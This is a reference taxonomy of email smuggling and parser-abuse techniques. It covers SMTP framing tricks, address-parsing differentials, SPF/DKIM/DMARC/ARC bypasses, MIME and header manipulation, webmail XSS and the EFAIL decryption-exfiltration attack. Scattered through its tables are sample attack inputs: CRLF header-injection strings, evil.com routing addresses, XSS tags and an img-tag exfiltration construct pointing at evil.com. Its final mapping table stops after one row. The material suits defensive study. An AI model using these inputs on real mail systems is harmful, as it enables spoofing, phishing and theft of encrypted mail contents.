# Email Smuggling / Email Parser Abuse — Mutation & Variation Taxonomy

---

## Classification Structure

Email smuggling and parser abuse encompass a broad family of attacks that exploit **parsing differentials** across the email delivery and rendering pipeline. An email traverses multiple independent components — SMTP MTAs, authentication engines (SPF/DKIM/DMARC), MIME parsers, security gateways, and Mail User Agents (MUAs) — each of which implements its own parser for addresses, headers, bodies, and protocol commands. When any two adjacent components disagree on how to interpret the same byte sequence, an attacker can smuggle content, spoof identity, evade detection, or bypass access controls.

This taxonomy is organized along three orthogonal axes:

**Axis 1 — Mutation Target (Primary):** The structural component of the email ecosystem being mutated. This axis forms the main body of the document, with eight top-level categories spanning SMTP protocol framing, email address syntax, authentication header semantics, MIME structure, message header fields, encoding layers, email client rendering, and cryptographic envelope integrity.

**Axis 2 — Discrepancy Type (Cross-Cutting):** The nature of the parsing disagreement that makes the mutation exploitable.

| Discrepancy Type | Description |
|-----------------|-------------|
| **Framing Mismatch** | Two components disagree on where one message ends and another begins |
| **Identity Mismatch** | Components extract different sender/domain identities from the same message |
| **Content Mismatch** | Security scanner and end-user client see different message bodies or attachments |
| **Routing Mismatch** | Email is delivered to an unintended destination due to address interpretation differences |
| **Validation Gap** | An authentication or authorization check is structurally absent or insufficiently scoped |

**Axis 3 — Attack Scenario (Mapping):** The real-world weaponization context.

| Scenario | Description |
|----------|-------------|
| **Email Spoofing** | Impersonating a trusted sender while passing authentication |
| **Authentication Bypass** | Circumventing SPF/DKIM/DMARC/ARC protections |
| **Access Control Bypass** | Gaining access to restricted resources by manipulating email-based identity |
| **Malware Delivery** | Evading email security gateways to deliver malicious attachments |
| **Phishing Amplification** | Leveraging legitimate infrastructure to send credible phishing at scale |
| **Data Exfiltration** | Extracting plaintext from encrypted email via MIME/rendering abuse |
| **Spam Amplification** | Replaying signed messages to send bulk unsolicited email |

---

## Foundational Concept: The Email Parsing Pipeline

An email message is processed by a chain of independent parsers, each implementing overlapping but non-identical specifications:

```
Sender MUA → Sending MTA (SMTP) → [Relay MTAs] → Receiving MTA (SMTP)
    → Authentication Engine (SPF/DKIM/DMARC/ARC)
    → Security Gateway (AV/anti-spam/DLP)
    → Recipient MUA (rendering)
```

The core RFCs governing email are numerous and sometimes contradictory:
- **RFC 5321** (SMTP protocol — envelope-level)
- **RFC 5322** (Internet Message Format — header/body-level)
- **RFC 2045–2049** (MIME — structure/encoding)
- **RFC 2047** (Encoded-words in headers)
- **RFC 7208** (SPF), **RFC 6376** (DKIM), **RFC 7489** (DMARC), **RFC 8617** (ARC)

The sheer complexity and overlap of these specifications guarantees implementation divergence — the fundamental property that makes the entire mutation space possible.

---

## §1. SMTP Protocol Framing Mutations

SMTP smuggling exploits disagreements between sending and receiving MTAs about where one email message ends and the next begins within a single SMTP session. The attack hinges on the **end-of-data (EOD) sequence** — the canonical `<CR><LF>.<CR><LF>` that terminates the DATA command.

### §1-1. End-of-Data Sequence Confusion

The SMTP DATA command (RFC 5321 §4.1.1.4) specifies that message data is terminated by `<CR><LF>.<CR><LF>`. However, real-world implementations accept variant sequences, creating framing mismatches.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Bare-LF EOD** (`<LF>.<LF>`) | Some servers accept bare line-feeds (without carriage returns) as line terminators, interpreting `<LF>.<LF>` as a valid EOD. If the sending server does not filter this sequence, an attacker embeds it mid-message to terminate data prematurely and inject new SMTP commands. | Inbound server accepts bare-LF as line terminator; outbound server does not filter bare-LF |
| **Bare-CR EOD** (`<CR>.<CR>`) | Servers that normalize bare-CR to CRLF (e.g., Cisco Secure Email's default "Clean" mode) effectively convert `<CR>.<CR>` into `<CR><LF>.<CR><LF>`, causing premature data termination. | Inbound server normalizes bare-CR to CRLF; Cisco "Clean" mode is default |
| **Mixed-Sequence EOD** (`<LF>.<CR><LF>`) | A hybrid sequence combining bare-LF and standard CRLF. Some MTAs interpret this as a valid EOD while others pass it through as literal message content. | Outbound server treats as message data; inbound server treats as EOD |
| **OS-Specific Line Ending** | Windows systems use `<CR><LF>`, Unix uses `<LF>`, and legacy Mac uses `<CR>`. MTAs compiled for different platforms may inherit these conventions, creating cross-platform framing mismatches. | Heterogeneous server environments |

### §1-2. SMTP Command Pipelining Abuse

Once a framing mismatch creates a premature EOD, the attacker injects subsequent SMTP commands (MAIL FROM, RCPT TO, DATA) into what the sending server considers message body content.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Outbound Smuggling** | The sending MTA (e.g., Exchange Online, GMX) fails to sanitize non-standard EOD sequences in outbound message data. The receiving MTA interprets the embedded sequence as a real EOD, then processes the attacker's injected SMTP commands as a new transaction. The smuggled message inherits the sending MTA's IP address, passing SPF. | Outbound MTA does not filter variant EOD sequences |
| **Inbound Smuggling** | The attacker directly connects to a permissive inbound MTA that accepts variant EOD sequences. A single SMTP session carries multiple logical messages: the first legitimate (or sacrificial), subsequent ones smuggled with arbitrary sender addresses. | Inbound MTA accepts non-standard EOD; no upstream filtering |
| **BDAT-Aware Evasion** | The BDAT (Binary Data) extension specifies message length explicitly rather than using an EOD marker, inherently preventing smuggling. Some attackers probe for DATA fallback when BDAT is rejected. | Server supports both DATA and BDAT; attacker forces DATA path |

### §1-3. SMTP Command Injection via Client Libraries

Applications that construct SMTP commands from user input without proper sanitization allow CRLF injection into protocol-level commands.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **MAIL FROM / RCPT TO Injection** | Newline characters (`\r\n`) in email address parameters passed to SMTP commands break out of the current command and inject arbitrary SMTP verbs (VRFY, RSET, new MAIL FROM/RCPT TO). | Application uses library that does not sanitize CRLF in address fields (e.g., libcurl SMTP client) |
| **ESMTP Parameter Injection** | SMTP extensions (SIZE, AUTH, BODY) accept parameters after the command. CRLF injection in these parameters smuggles additional commands. | Web application passes unsanitized input to ESMTP parameter fields |
| **IMAP Command Injection** | Webmail applications that construct IMAP commands from user input allow injection of IMAP verbs (FETCH, STORE, SEARCH) via CRLF sequences, enabling unauthorized mailbox access. | Webmail frontend does not sanitize CRLF before passing to IMAP backend |

### §1-4. Shared Infrastructure Amplification

When SMTP smuggling occurs through shared email service providers, the impact is amplified because SPF records, IP ranges, and DKIM keys are shared across all tenants.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Shared SPF Record Exploitation** | Multi-tenant email providers include their IP ranges in each customer's SPF record. A smuggled message originating from the provider's IP passes SPF for *any* customer domain. | Shared hosting with common SPF `include:` directives |
| **Multi-Tenant Identity Confusion** | An authenticated user on a shared hosting platform sends email claiming to be from a different tenant's domain. The provider's MTA does not verify that the authenticated identity matches the MAIL FROM domain. | Hosting provider does not enforce per-tenant sender identity verification (CVE-2024-7208, CVE-2024-7209) |
| **Forwarding Service Abuse** | Email forwarding services (mailing lists, "Hide My Email" services) re-send messages from their own infrastructure, inheriting SPF alignment for the forwarding domain while preserving the original From header. | Forwarding service creates new SMTP envelope while preserving original message headers |

---

## §2. Email Address Parsing Mutations

Email address syntax is defined by RFC 5321 (SMTP envelope), RFC 5322 (message headers), and RFC 2047 (encoded-words). These specifications allow quoted local-parts, comments, source routes, and encoded-word representations — features that most parsers implement incompletely or inconsistently. Discrepancies between how a security check parses an address and how the delivery system routes it enable domain spoofing, routing mismatch, and access control bypass.

### §2-1. Quoted Local-Part Exploitation

RFC 5322 permits the local-part of an email address to be enclosed in double quotes, allowing characters that are otherwise illegal (including `@`, spaces, and special characters).

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Embedded-@ in Quoted String** | `"attacker@evil.com"@legitimate.com` — some parsers extract `evil.com` as the domain (splitting at the first `@`), while others correctly identify `legitimate.com`. This enables routing to an attacker-controlled domain while appearing to belong to the legitimate domain. | Validation parser treats entire quoted string as local-part; routing parser splits at first `@` |
| **Quote Stripping Differential** | Some parsers strip quotes before evaluation (seeing `attacker@evil.com@legitimate.com`), while others preserve them. The stripped version routes to `evil.com`; the preserved version routes to `legitimate.com`. | Security check preserves quotes; delivery system strips them (or vice versa) |
| **Escaped Character Injection** | `"attacker\@evil.com"@legitimate.com` — the backslash-escaped `@` should be treated as a literal character within the quoted string, but some parsers process escapes inconsistently. | Inconsistent backslash-escape handling between validation and routing |

### §2-2. Comment Injection

RFC 5322 allows parenthetical comments in email addresses: `user(comment)@example.com`. Comments should be stripped during processing, but implementations differ on where comments are allowed and how they affect parsing.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Domain-Part Comment** | `user@example.com(evil.com)` — some parsers treat text after a comment in the domain as part of the domain itself; others correctly strip the comment. | Parser does not correctly handle comment boundaries in domain portion |
| **Local-Part Comment Injection** | `(evil.com)user@example.com` — injecting a comment before the local-part that some parsers misinterpret as part of the address structure. | Comment in local-part position confuses domain extraction |
| **Nested Comment Abuse** | RFC 5322 allows nested comments: `user@example.com((nested))`. Parsers that do not handle nesting correctly may leave unmatched parentheses, corrupting address parsing. | Parser lacks proper nested comment support |

### §2-3. Encoded-Word Manipulation (RFC 2047)

The encoded-word syntax `=?charset?encoding?data?=` was designed for representing non-ASCII characters in headers. It can be weaponized to encode special characters (`@`, `<`, `>`, spaces) that bypass character-level validation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Encoded-@ Bypass** | `=?UTF-8?q?attacker=40evil.com?=@legitimate.com` — the `=40` decodes to `@` after validation but before routing, causing the email to route to `evil.com`. | Validation occurs before encoded-word decoding; routing occurs after |
| **Encoded-Space Splitting** | `user=20@evil.com@legitimate.com` — encoded space (`=20`) splits the address at different stages of processing, causing different parsers to extract different domains. | Parser decodes encoded-word before or after domain extraction inconsistently |
| **Charset Stacking** | Layering encodings (e.g., UTF-7 within Q-encoding: `=?UTF-7?q?...?=`) creates multiple decoding stages where each stage may produce different results. Intermediate charset conversions can introduce characters that were not present in the input. | Multi-stage decoding with charset conversion between stages |
| **Null-Byte Injection via Encoding** | `=?UTF-8?q?user=00?=@evil.com@legitimate.com` — a null byte terminates string processing in C-based parsers, causing truncation of the address at different points. | C/C++-based parser truncates at null byte; other parsers ignore or remove it |

### §2-4. Unicode and Internationalization Abuse

Internationalized email addresses (RFC 6531) and Internationalized Domain Names (RFC 5890) introduce Unicode processing, creating new parser differential opportunities.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unicode Overflow / Codepoint Truncation** | Characters above codepoint 255, when stored in a single byte, overflow via modulus arithmetic (e.g., codepoint 8448 mod 256 = 0x40 = `@`). This generates ASCII special characters from seemingly innocuous Unicode input. | Server performs modulus-based byte truncation on Unicode characters |
| **IDN Homograph Confusion** | Punycode domains use visually similar Unicode characters from different scripts (e.g., Cyrillic `а` for Latin `a`) to impersonate legitimate domains. Email clients that display decoded Unicode render `xn--pple-43d.com` as `аpple.com`. | Email client decodes and displays Punycode without visual homograph warning |
| **Malformed Punycode Injection** | Defective Punycode decoding (e.g., PHP's `idn_to_utf8()`) can produce unexpected characters from crafted `xn--` sequences. `xn--0049` may decode to a comma; `xn--svg/-9x6` may produce `<svg/`. This enables HTML/CSS injection via email address fields. | Library-specific Punycode decoding bugs produce control or markup characters |
| **Unicode Variation Selector Abuse** | Zero-width Unicode variation selectors (U+FE0E, U+FE0F) pass length validation but may be stripped during later processing, creating length-based truncation differentials in database storage. | Length validation counts variation selectors; storage truncates by byte count |

### §2-5. Legacy Address Format Exploitation

Older RFC-permitted address formats that remain syntactically valid but are rarely implemented correctly.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Source Route Address** | `@relay1,@relay2:user@destination.com` — RFC 5321 source routes specify intermediate relays. Most modern MTAs ignore them, but some parsers extract the domain from the route rather than the destination. | Parser extracts domain from source route instead of final destination |
| **Percent-Hack Routing** | `user%evil.com@relay.com` — a legacy convention where `%` is interpreted as `@` by the relay, forwarding the message to `evil.com`. Modern MTAs that still support percent-hack routing can be exploited for mail redirection. | Relay MTA supports percent-hack convention |
| **UUCP Bang-Path** | `evil.com!user\@legitimate.com` — UUCP-style routing where `!` separates hops. If the parser processes UUCP syntax, the email routes through `evil.com`. | Parser or MTA recognizes UUCP bang-path addressing |

---

## §3. Authentication Protocol Mutations (SPF / DKIM / DMARC / ARC)

Email authentication relies on the coordinated operation of SPF, DKIM, and DMARC. Each protocol validates a different aspect of sender identity, and the composition of these independent checks creates exploitable gaps — particularly when the identity verified by one protocol differs from the identity displayed to the user.

### §3-1. SPF Validation Bypass

SPF (RFC 7208) authorizes IP addresses to send email for a domain by checking the MAIL FROM (envelope sender) against DNS records.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Shared IP Authorization** | SPF records using broad `include:` directives (e.g., `include:spf.protection.outlook.com`) authorize all IP addresses of a shared provider. Any tenant can send email claiming any other tenant's domain. | Multi-tenant hosting with shared SPF records (CVE-2024-7209) |
| **Permissive SPF Record** | Domains using `~all` (softfail) or `?all` (neutral) rather than `-all` (hardfail) allow messages from unauthorized IPs to be delivered with reduced suspicion. | Domain SPF policy is softfail or neutral |
| **SPF Null Sender Bypass** | An empty MAIL FROM (`<>`) causes SPF to check the HELO/EHLO identity instead. Attackers control the HELO identity, pointing it to a domain with a permissive SPF record. | SPF evaluates HELO identity for null sender; attacker controls HELO string |
| **SPF Forwarding Break** | Email forwarding changes the sending IP, causing SPF to fail for the original domain. Receivers may then fall through to weaker checks or ignore SPF failure entirely. | Email is forwarded; no SRS or ARC in place |

### §3-2. DKIM Signature Exploitation

DKIM (RFC 6376) provides cryptographic signing of specified headers and the message body, but the scope of what is signed and how signatures are validated creates exploitable gaps.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **DKIM Replay Attack** | A legitimately DKIM-signed message is captured and re-sent to different recipients. Since DKIM only validates the signature against the signed content (not the envelope), the replayed message passes DKIM and DMARC for the original domain at arbitrary scale. | DKIM signature does not expire quickly; no per-recipient binding |
| **Header Field Non-Coverage** | DKIM signs only headers listed in the `h=` tag. Unsigned headers (e.g., Subject, CC, Reply-To) can be modified after signing without invalidating the signature. An attacker can alter the message context while preserving authentication. | Critical headers not included in DKIM `h=` tag |
| **Domain Mismatch (d= vs. From)** | The DKIM `d=` domain in the signature need not match the From header domain. An attacker signs with their own domain's key while spoofing the From header. Without strict DMARC alignment, DKIM passes but the displayed sender is forged. | No DMARC policy or DMARC set to relaxed alignment |
| **Extra From Header Injection** | A DKIM-signed message has a single From header that the DKIM component verifies. An attacker adds a second From header; the DKIM engine validates the original while the MUA displays the injected one. | MUA displays last (or first) From header; DKIM validates a different one |
| **DKIM Key Reuse / Weak Key** | Short DKIM keys (512-bit or 768-bit) can be factored, allowing an attacker to forge DKIM signatures for the target domain. | Domain uses a DKIM key shorter than 1024 bits |
| **OAuth-Triggered DKIM Replay** | An attacker creates an OAuth application that triggers a legitimate security alert email from the provider (e.g., Google). This email is DKIM-signed by the provider. The attacker then forwards/replays this signed email from a different service, passing all DKIM and DMARC checks while the content contains attacker-controlled elements (e.g., OAuth app name containing phishing text). | Provider generates DKIM-signed notification with attacker-controllable content fields |

### §3-3. DMARC Policy Circumvention

DMARC (RFC 7489) ties SPF and DKIM to the From header domain via alignment checks. However, it requires only *one* of SPF or DKIM to align, and its alignment modes (strict vs. relaxed) create additional gaps.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Relaxed Alignment Exploitation** | Under relaxed alignment, `subdomain.example.com` aligns with `example.com`. An attacker who controls any subdomain (or finds one with a permissive SPF) can send DMARC-passing email appearing to be from the parent domain. | DMARC uses relaxed alignment (default); attacker controls a subdomain |
| **SPF-Only Pass** | DMARC passes if either SPF or DKIM aligns. If SPF aligns (via shared infrastructure, §1-4) but DKIM is absent or misaligned, the message still passes DMARC. | DMARC does not require both SPF and DKIM to pass |
| **DMARC p=none Exploitation** | Domains in "monitoring only" mode (`p=none`) do not instruct receivers to reject failing messages. Many large organizations remain in monitoring mode indefinitely. | Target domain has DMARC p=none |
| **Organizational Domain Confusion** | DMARC determines the "organizational domain" via the Public Suffix List. Misclassifications in the PSL can cause incorrect alignment calculations. | Public Suffix List entry is missing or incorrect for the target domain |

### §3-4. ARC Chain Manipulation

ARC (RFC 8617) preserves authentication results across forwarding hops. Its trust model depends on the integrity of intermediate sealers.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ARC Chain Forging** | An attacker fabricates an ARC chain with `arc=pass` in the Authentication-Results, convincing the receiver that a forwarded message was authenticated at a previous hop. | Receiver trusts ARC chains from unknown or insufficiently validated sealers |
| **ARC Header Stripping** | An intermediary strips existing ARC headers and re-seals with fabricated authentication results. If the receiver does not detect the broken chain continuity, the forged results are accepted. | Receiver does not validate ARC chain sequence numbers or signature continuity |
| **Forwarding Service ARC Abuse** | Privacy-preserving forwarding services (e.g., Apple "Hide My Email", Firefox Relay) break original authentication and introduce their own ARC chain. Attackers can exploit these services to launder spoofed messages through a trusted ARC sealer. | Forwarding service is a trusted ARC sealer at the receiver; does not validate inbound authentication strictly |

### §3-5. Delegation Mechanism Abuse (Sender Field)

The email Sender header (RFC 5322 §3.6.2) indicates the agent who transmitted the message on behalf of the author (From). This delegation mechanism lacks strong authentication.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Sender Field Fabrication** | The Sender field is not validated by SPF, DKIM, or DMARC. An attacker sets an arbitrary Sender value to impersonate a trusted delegate (e.g., an executive assistant or shared mailbox). MUAs display "sent on behalf of" with the spoofed delegate. | No authentication protocol validates the Sender header |
| **Delegate Display Confusion** | Some MUAs prominently display the Sender field alongside or instead of the From field. Users trust the delegate identity without verifying the actual sender. | MUA UI emphasizes Sender field display |

---

## §4. MIME Structure Mutations

MIME (RFC 2045–2049) defines the structure of multi-part email messages, including boundaries, content types, transfer encodings, and nested entities. Security gateways and email clients implement MIME parsing independently, creating content mismatch opportunities where the scanner sees benign content while the client renders malicious payloads.

### §4-1. Boundary Confusion

Multipart MIME messages use boundary strings to delimit parts. Ambiguity in boundary declaration or interpretation enables content hiding.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Conflicting Boundary Declarations** | A Content-Type header declares boundary `foo`, but a secondary or duplicated Content-Type declares boundary `bar`. Scanners using the first boundary see only benign content; clients using the last boundary see the malicious attachment. | Scanner and client disagree on which Content-Type header (first vs. last) takes precedence |
| **Encoded-Word Boundary** | The boundary parameter is declared in encoded-word format: `boundary="=?US-ASCII?Q?foo?="`. Some parsers treat the entire encoded string as the boundary; others decode it to `foo` first, then search for `--foo` delimiters. Content before the decoded boundary is discarded as preamble. | Parser either decodes or preserves encoded-word in boundary parameter |
| **Boundary String Injection** | A boundary string is chosen to appear within the message body content, causing premature part termination. A MIME-unaware parser treats the injected boundary as content; a MIME-aware parser splits at it. | Boundary string collides with body content; parser behavior diverges |
| **Missing Boundary Handling** | When a declared multipart message has no matching boundary in the body, some parsers treat the entire body as a single part (fallback rendering), while others discard the entire message. An attacker hides content in the "missing" region that only fallback-rendering clients display. | Parser fallback behavior differs: render-all vs. discard-all |

### §4-2. Content-Type Ambiguity

Multiple or contradictory Content-Type headers create semantic gaps between parsers.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Multiple Content-Type Headers** | An email contains two Content-Type headers: one declaring `text/plain`, another declaring `multipart/mixed`. Gmail, iCloud, and Coremail use the first; Outlook and eMClient use the last. An attacker places the malicious payload in the part that only last-Content-Type parsers see. | Scanner uses first Content-Type; client uses last (or vice versa) |
| **Content-Type Parameter Injection** | Extra parameters in the Content-Type header (e.g., `Content-Type: text/html; name="malware.exe"; charset=utf-8`) may be parsed differently by scanners that stop at the first parameter versus clients that process all. | Scanner parses a subset of Content-Type parameters |
| **Nested Multipart Depth Bomb** | Deeply nested multipart structures (multipart within multipart within multipart...) can exceed the parsing depth limit of security scanners while clients process them fully, revealing hidden content. | Scanner has a maximum nesting depth; client does not |
| **Content-Type vs. Content-Disposition Conflict** | When Content-Type declares `text/plain` but Content-Disposition specifies `attachment; filename="payload.exe"`, parsers disagree on whether to render inline or treat as attachment. | Scanner trusts Content-Type for threat assessment; client follows Content-Disposition for handling |

### §4-3. Transfer Encoding Discrepancies

Base64 and quoted-printable encodings have edge cases that parsers handle differently.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Invalid Base64 Characters** | RFC 2045 states that characters outside the base64 alphabet should be ignored, but implementations vary: some reject the entire part, others strip invalid characters, others treat them as line breaks. These differences yield different decoded outputs from the same encoded input. | Parser strictness for invalid base64 characters differs between scanner and client |
| **Quoted-Printable Soft Line Break Abuse** | QP encoding uses `=` at line end for soft line breaks. Malicious content split across soft line breaks may not match signature-based scanning while reconstructing correctly in the client. | Scanner performs pattern matching before QP reassembly |
| **Content-Transfer-Encoding Null Truncation** | A null byte (`\x00`) inserted before the Content-Transfer-Encoding header value causes C-based parsers to truncate the header, falling back to 7-bit ASCII interpretation. Other parsers skip the null and read the actual encoding, producing different decoded results. | C/C++ parser truncates at null byte; non-C parser ignores it |
| **Double Encoding** | Content is encoded twice (e.g., base64-encoded content with a Content-Transfer-Encoding of quoted-printable). Some parsers apply both decodings; others apply only one, seeing garbled but benign output. | Scanner applies single decoding; client applies double decoding |

### §4-4. MIME Part Hiding

Techniques for placing content where scanners do not look but clients render.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Preamble / Epilogue Content** | MIME defines a preamble (before the first boundary) and epilogue (after the last boundary) as non-meaningful. Some email clients render preamble/epilogue content; security scanners typically skip it. | Client renders preamble/epilogue; scanner ignores it |
| **multipart/related Hidden Reference** | In multipart/related, secondary parts are referenced by Content-ID from the primary HTML part. A secondary part not referenced in the HTML should be ignored per spec, but some clients make it available as an attachment. | Client surfaces non-referenced related parts; scanner ignores them |
| **text/rfc822-headers as Container** | The `message/rfc822` content type wraps an entire email message as an attachment. Malicious content inside the wrapped message may escape scanning that only examines the outer MIME structure. | Scanner does not recursively parse message/rfc822 attachments |

---

## §5. Message Header Mutations

Email message headers (RFC 5322) control routing, display, and authentication. Header-level mutations exploit inconsistencies in how MTAs, authentication engines, and MUAs process headers.

### §5-1. Header Injection via CRLF

When web applications construct email headers from user input, CRLF injection allows arbitrary header insertion.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **BCC Header Injection** | `attacker@evil.com\r\nBcc: victim@target.com` — injecting a BCC header adds hidden recipients. The mail library converts each address to an RCPT TO command. | Application does not strip CRLF from user-supplied address fields |
| **Subject/Reply-To Injection** | CRLF in the "name" or "subject" field of a contact form injects headers that control the reply path or displayed subject of the resulting email. | Application passes unvalidated form fields into email header construction |
| **Content-Type Injection** | CRLF injection in header fields followed by a blank line and attacker-controlled body content allows complete replacement of the email body, including insertion of HTML with malicious payloads. | Injected CRLF followed by blank line terminates headers, starting body |

### §5-2. Multiple / Ambiguous Header Fields

RFC 5322 specifies that most header fields should appear at most once, but does not mandate hard failure on duplicates. Different components resolve duplicates differently.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Multiple From Headers** | Two From headers with different addresses. DKIM may validate the first; the MUA may display the second. This enables authentication to pass for a legitimate address while the user sees a spoofed one. | DKIM validates first From; MUA renders last From (or vice versa) |
| **Multiple To/CC Headers** | Duplicate To or CC headers can cause messages to be delivered to addresses that do not appear in the header visible to the MUA, enabling blind message delivery. | MTA processes all To/CC headers for routing; MUA displays only one |
| **Header Order Sensitivity** | Some parsers process headers in order, using the first or last occurrence. Authentication engines and MUAs may use different positional preferences, creating identity divergence. | Positional preference differs between authentication engine and MUA |

### §5-3. Display Name Spoofing

The From header format `"Display Name" <address@domain.com>` allows arbitrary display names. MUAs, especially on mobile, often show only the display name.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Trusted Name Impersonation** | Display name set to a CEO, vendor, or brand name (e.g., `"PayPal Security" <random@evil.com>`). The actual address is from an unrelated domain. | MUA shows only display name; user does not verify address |
| **Address-in-Display-Name** | `"ceo@company.com" <attacker@evil.com>` — the display name itself looks like a trusted email address, confusing users who assume it is the actual sender. | MUA displays the display name prominently; user mistakes it for the address |
| **From Header with Group Syntax** | RFC 6854 permits group syntax in From: `Group: <addr1>, <addr2>;`. Some clients display only the last address; an attacker places their identity last while the first legitimate address passes authentication. | MUA parses group syntax and displays a subset of listed addresses |

---

## §6. Encoding and Charset Mutations

Encoding-layer mutations exploit differences in how systems decode character encodings, transfer encodings, and internationalization features.

### §6-1. Charset Confusion

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **UTF-7 Injection** | Content declared as UTF-7 uses `+ADw-` for `<` and `+AD4-` for `>`. Scanners that process content as UTF-8 see benign encoded text; clients that decode UTF-7 render HTML tags. | Scanner does not decode UTF-7; client auto-detects and decodes it |
| **Charset Mismatch** | Content-Type declares `charset=iso-8859-1` but the body contains UTF-8 multi-byte sequences. Scanners interpreting as ISO-8859-1 see different characters than clients auto-detecting UTF-8. | Scanner respects declared charset; client auto-detects actual encoding |
| **Undeclared Charset Fallback** | When no charset is declared, different systems fall back to different defaults (US-ASCII, ISO-8859-1, UTF-8, system locale). Content crafted to be benign in one encoding but malicious in another exploits the fallback divergence. | Scanner and client use different default charset fallback |

### §6-2. HTML Entity and URL Encoding in Email Body

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **HTML Entity Obfuscation** | Malicious URLs encoded as HTML entities (`&#104;&#116;&#116;&#112;...`) bypass text-based URL scanning but are rendered correctly by HTML email clients. | Scanner performs text matching without HTML entity decoding |
| **Double URL Encoding** | Links in HTML email use percent-encoding (`%25%36%38` for `%68` for `h`). The email client's HTML renderer decodes one layer; the browser decodes the second when the link is clicked. | Scanner decodes only one layer; click path decodes both |
| **Base64-Encoded HTML Body** | The entire HTML body is base64-encoded. Some scanners scan the decoded content; others treat the entire base64 block as an opaque blob. | Scanner does not decode base64 body for content inspection |

---

## §7. Email Client Rendering Mutations

Email clients (MUAs) render HTML, CSS, and attachments with varying levels of sanitization. Rendering differences create exploitable gaps for XSS, credential theft, and content manipulation.

### §7-1. HTML Sanitization Bypass in Webmail

Webmail clients render HTML emails in the browser context, requiring robust sanitization to prevent XSS.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Tag/Attribute Obfuscation** | Malformed HTML tags bypass sanitization regex: `<img/src=x onerror=alert(1)>`, `<svg onload=...>`, or using null bytes within tag names. The browser's error-recovery parser renders the tag despite sanitization. | Webmail sanitizer uses regex or incomplete HTML parsing; browser applies error recovery |
| **CSS-Based Content Injection** | `<style>` tags or inline styles with `background-image: url(...)` exfiltrate data via external resource loading or manipulate displayed content via CSS `content:` properties. | Webmail allows CSS properties that trigger external requests |
| **SVG Payload in Attachment** | SVG files (which are XML-based) can contain embedded JavaScript. When rendered inline by the email client, the script executes. | Email client renders SVG attachments in a privileged context |
| **DOM Clobbering via HTML Email** | Named HTML elements (`id="x"`, `name="y"`) in email content clobber JavaScript variables in the webmail application, potentially altering application behavior. | Webmail renders email HTML in the same DOM as application logic |
| **Unicode Encoding Bypass** | HTML tags encoded using Unicode escapes (`&#x3C;script&#x3E;`) bypass keyword-based sanitization filters that search for literal `<script>` strings. Later HTML rendering decodes and executes them. | Sanitizer operates on pre-decoded text; renderer decodes Unicode entities |

### §7-2. Plaintext-to-HTML Conversion Attacks

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Plaintext Email HTML Injection** | Content-Type is `text/plain`, but the body contains HTML tags. Some clients render plaintext literally; others auto-detect and render HTML, executing embedded scripts or displaying phishing content. | Email client auto-converts plaintext to HTML for rendering |
| **Markdown Injection** | Some email clients or email-generating libraries interpret markdown syntax in plaintext emails, converting `[Click Here](http://evil.com)` into clickable links. | Email rendering pipeline includes markdown processing |

### §7-3. Email Tracking and Cloaking

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Pixel Tracking for Cloaking** | Email contains tracking pixels (1x1 images) or CSS-based tracking that detects when the email is opened and by whom. When a phishing report triggers a security crawler visit, the attacker's server serves benign content; real users see the phishing page. | Attacker detects crawler vs. human via tracking signals (User-Agent, IP, timing) |
| **CSS Media Query Fingerprinting** | CSS `@media` queries reveal the client's viewport size, color scheme preference, and device type. This information is used to serve targeted content or to distinguish security scanners from real users. | Email client processes CSS media queries and loads conditional external resources |

---

## §8. Cryptographic Envelope Mutations (S/MIME & PGP)

Encrypted email (S/MIME, OpenPGP) introduces a cryptographic layer that interacts with MIME structure. When the decryption and rendering stages are not properly isolated, attackers can exfiltrate plaintext from encrypted messages.

### §8-1. EFAIL — Plaintext Exfiltration

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct Exfiltration** | An attacker wraps a captured ciphertext block within an HTML `<img src="https://evil.com/` prefix tag, leaving the tag unclosed. When the client decrypts, the plaintext completes the URL. The client loads the "image," sending the plaintext to the attacker's server in the URL. | Email client renders HTML in decrypted content and loads external images automatically |
| **CBC Malleability Gadget** | In S/MIME CBC mode, an attacker who knows one plaintext block (e.g., the predictable "Content-type: multipart/signed" header) can XOR-modify adjacent ciphertext blocks to inject an `<img>` tag. Decryption produces the gadget plus garbled bytes, but the HTML parser's error recovery renders the exfiltration tag. | S/MIME uses CBC mode without integrity protection; client loads external resources |
| **MIME Structure Manipulation** | An attacker alters the outer MIME structure of an encrypted email (which is not integrity-protected) to wrap the encrypted part inside an attacker-controlled HTML context, creating an exfiltration channel upon decryption. | Outer MIME structure (envelope) is not covered by the cryptographic signature |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture / Conditions | Primary Mutation Categories |
|----------|--------------------------|---------------------------|
| **Email Spoofing (Identity)** | Attacker sends email appearing to be from a trusted domain, passing authentication | §1-2 + §1-4 + §3-1 + §3-2 + §3-3 + §3-5 |
